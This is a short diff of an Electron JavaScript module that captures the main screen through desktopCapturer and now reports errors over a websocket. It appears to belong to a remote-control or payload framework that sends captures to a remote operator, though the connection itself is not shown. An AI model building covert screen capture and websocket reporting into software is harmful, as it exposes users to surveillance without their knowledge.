@@ -5,7 +5,7 @@
  *
  * Info: Takes a screenshot of the main screen.
  * Parameters: None
- * Returns: Data URL of screenshot
+ * Returns: undefined, Data URL of screenshot
  * Author: IMcPwn
  */
 
@@ -18,12 +18,11 @@ if (typeof fs == 'undefined') fs = require('fs');
 if (typeof os == 'undefined') os = require('os');
 if (typeof path == 'undefined') path = require('path');
 
-
 if (typeof thumbSize == 'undefined') thumbSize = determineScreenShotSize();
 if (typeof options == 'undefined') options = { types: ['screen'], thumbnailSize: thumbSize };
 
 desktopCapturer.getSources(options, function (error, sources) {
-    if (error) return console.error(error)
+    if (error) ws.send(error)
 
     sources.forEach(function (source) {
         if (source.name === 'Entire screen' || source.name === 'Screen 1') {
